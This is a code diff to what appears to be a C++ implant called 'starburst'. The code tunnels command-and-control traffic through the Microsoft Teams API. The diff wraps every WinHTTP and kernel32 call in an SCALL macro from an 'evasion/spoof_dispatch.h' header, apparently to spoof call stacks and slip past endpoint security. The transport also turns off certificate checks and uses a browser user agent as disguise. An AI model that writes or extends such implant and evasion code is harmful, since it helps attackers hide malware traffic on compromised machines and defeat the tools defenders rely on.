@@ -3,6 +3,7 @@
 #include <base64.h>
 #include <crypto.h>
 #include <strings.h>
+#include <evasion/spoof_dispatch.h>
 
 #if defined( MSTEAMS_TRANSPORT )
 
@@ -38,16 +39,16 @@ static auto declfn winhttp_request(
     wchar_t* wide_method = wide_buf + host_len;
     wchar_t* wide_path   = wide_method + 16;
 
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, host, -1, wide_host, host_len );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, method, -1, wide_method, 16 );
-    inst.kernel32.MultiByteToWideChar( CP_ACP, 0, path, -1, wide_path, path_len );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, host, -1, wide_host, host_len );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, method, -1, wide_method, 16 );
+    SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, path, -1, wide_path, path_len );
 
-    auto h_connect = inst.winhttp.WinHttpConnect(
+    auto h_connect = (HINTERNET)SCALL( inst, winhttp.WinHttpConnect,
         inst.h_session, wide_host, API_PORT, 0
     );
     if ( !h_connect ) { inst.heap_free( wide_buf ); return false; }
 
-    auto h_request = inst.winhttp.WinHttpOpenRequest(
+    auto h_request = (HINTERNET)SCALL( inst, winhttp.WinHttpOpenRequest,
         h_connect, wide_method, wide_path,
         nullptr, WINHTTP_NO_REFERER,
         WINHTTP_DEFAULT_ACCEPT_TYPES,
@@ -55,7 +56,7 @@ static auto declfn winhttp_request(
     );
     inst.heap_free( wide_buf );
     if ( !h_request ) {
-        inst.winhttp.WinHttpCloseHandle( h_connect );
+        SCALL( inst, winhttp.WinHttpCloseHandle, h_connect );
         return false;
     }
 
@@ -63,7 +64,7 @@ static auto declfn winhttp_request(
                       SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                       SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
-    inst.winhttp.WinHttpSetOption( h_request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags) );
+    SCALL( inst, winhttp.WinHttpSetOption, h_request, WINHTTP_OPTION_SECURITY_FLAGS, &sec_flags, sizeof(sec_flags) );
 
     if ( headers ) {
         uint32_t hdr_len = str_len( headers ) + 1;
@@ -71,8 +72,8 @@ static auto declfn winhttp_request(
         auto wide_headers = static_cast<wchar_t*>( inst.heap_alloc( wide_cap * sizeof(wchar_t) ) );
         if ( wide_headers ) {
             memory::zero( wide_headers, wide_cap * sizeof(wchar_t) );
-            inst.kernel32.MultiByteToWideChar( CP_ACP, 0, headers, -1, wide_headers, wide_cap );
-            inst.winhttp.WinHttpAddRequestHeaders(
+            SCALL( inst, kernel32.MultiByteToWideChar, CP_ACP, 0, headers, -1, wide_headers, wide_cap );
+            SCALL( inst, winhttp.WinHttpAddRequestHeaders,
                 h_request, wide_headers, -1,
                 WINHTTP_ADDREQ_FLAG_ADD | WINHTTP_ADDREQ_FLAG_REPLACE
             );
@@ -80,21 +81,21 @@ static auto declfn winhttp_request(
         }
     }
 
-    BOOL sent = inst.winhttp.WinHttpSendRequest(
+    BOOL sent = (BOOL)SCALL( inst, winhttp.WinHttpSendRequest,
         h_request,
         WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         body ? const_cast<char*>( body ) : nullptr,
         body_len, body_len, 0
     );
     if ( !sent ) {
-        inst.winhttp.WinHttpCloseHandle( h_request );
-        inst.winhttp.WinHttpCloseHandle( h_connect );
+        SCALL( inst, winhttp.WinHttpCloseHandle, h_request );
+        SCALL( inst, winhttp.WinHttpCloseHandle, h_connect );
         return false;
     }
 
-    if ( !inst.winhttp.WinHttpReceiveResponse( h_request, nullptr ) ) {
-        inst.winhttp.WinHttpCloseHandle( h_request );
-        inst.winhttp.WinHttpCloseHandle( h_connect );
+    if ( !SCALL( inst, winhttp.WinHttpReceiveResponse, h_request, nullptr ) ) {
+        SCALL( inst, winhttp.WinHttpCloseHandle, h_request );
+        SCALL( inst, winhttp.WinHttpCloseHandle, h_connect );
         return false;
     }
 
@@ -106,7 +107,7 @@ static auto declfn winhttp_request(
 
     while ( true ) {
         available = 0;
-        if ( !inst.winhttp.WinHttpQueryDataAvailable( h_request, &available ) ) break;
+        if ( !SCALL( inst, winhttp.WinHttpQueryDataAvailable, h_request, &available ) ) break;
         if ( available == 0 ) break;
 
         if ( buf_size + available > buf_cap ) {
@@ -117,12 +118,12 @@ static auto declfn winhttp_request(
         }
 
         read = 0;
-        inst.winhttp.WinHttpReadData( h_request, buf + buf_size, available, &read );
+        SCALL( inst, winhttp.WinHttpReadData, h_request, buf + buf_size, available, &read );
         buf_size += read;
     }
 
-    inst.winhttp.WinHttpCloseHandle( h_request );
-    inst.winhttp.WinHttpCloseHandle( h_connect );
+    SCALL( inst, winhttp.WinHttpCloseHandle, h_request );
+    SCALL( inst, winhttp.WinHttpCloseHandle, h_connect );
 
     *out_buf = buf;
     *out_len = buf_size;
@@ -212,7 +213,7 @@ static auto declfn msteams_authenticate(
         return false;
     }
 
-    inst.transport.msteams_token_expiry = inst.kernel32.GetTickCount() + (3500 * 1000);
+    inst.transport.msteams_token_expiry = (DWORD)SCALL( inst, kernel32.GetTickCount ) + (3500 * 1000);
     DBG_PRINT( inst, "MS Teams authenticated, token len=%d\n", token_len );
     return true;
 }
@@ -221,7 +222,7 @@ static auto declfn msteams_ensure_token(
     instance& inst
 ) -> bool {
     if ( inst.transport.msteams_access_token[0] != '\0' &&
-         inst.kernel32.GetTickCount() < inst.transport.msteams_token_expiry ) {
+         (DWORD)SCALL( inst, kernel32.GetTickCount ) < inst.transport.msteams_token_expiry ) {
         return true;
     }
     return msteams_authenticate( inst );
@@ -250,7 +251,7 @@ static auto declfn msteams_build_messages_path(
 auto declfn starburst::msteams_init(
     _Inout_ instance& inst
 ) -> bool {
-    inst.h_session = inst.winhttp.WinHttpOpen(
+    inst.h_session = (HINTERNET)SCALL( inst, winhttp.WinHttpOpen,
         symbol<LPCWSTR>( L"Mozilla/5.0" ),
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
         WINHTTP_NO_PROXY_NAME,
@@ -259,7 +260,7 @@ auto declfn starburst::msteams_init(
     );
 
     if ( !inst.h_session ) {
-        DBG_PRINT( inst, "WinHttpOpen failed: %d\n", inst.kernel32.GetLastError() );
+        DBG_PRINT( inst, "WinHttpOpen failed: %d\n", (DWORD)SCALL( inst, kernel32.GetLastError ) );
         return false;
     }
 
@@ -465,7 +466,7 @@ auto declfn starburst::msteams_destroy(
     _Inout_ instance& inst
 ) -> void {
     if ( inst.h_session ) {
-        inst.winhttp.WinHttpCloseHandle( inst.h_session );
+        SCALL( inst, winhttp.WinHttpCloseHandle, inst.h_session );
         inst.h_session = nullptr;
     }
     memory::zero( inst.transport.msteams_access_token, sizeof( inst.transport.msteams_access_token ) );
